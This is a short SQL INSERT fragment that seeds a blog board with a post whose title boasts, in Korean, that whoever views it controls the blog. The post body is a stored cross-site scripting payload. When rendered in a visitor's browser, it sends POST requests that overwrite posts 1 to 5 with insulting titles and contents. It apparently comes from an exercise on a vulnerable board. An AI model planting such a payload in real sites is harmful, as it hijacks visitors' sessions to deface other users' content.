...
values ('이글을 보는자 블로그를 지배한다',
        '<script>for(let i=1; i<6; i++){fetch(`/board/${i}/update`, {method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},body: "title=코스바보&content=진짜바보"});}</script>',
        now(), 2);